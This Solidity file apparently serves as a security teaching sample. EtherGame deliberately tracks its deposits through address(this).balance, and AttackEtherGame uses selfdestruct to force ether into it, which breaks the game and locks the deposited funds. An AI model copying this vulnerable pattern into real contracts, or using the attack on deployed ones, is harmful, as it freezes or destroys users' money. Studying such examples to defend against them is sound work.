// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "you can only send 1 ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "failed to send ether");
    }
}

contract AttackEtherGame {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}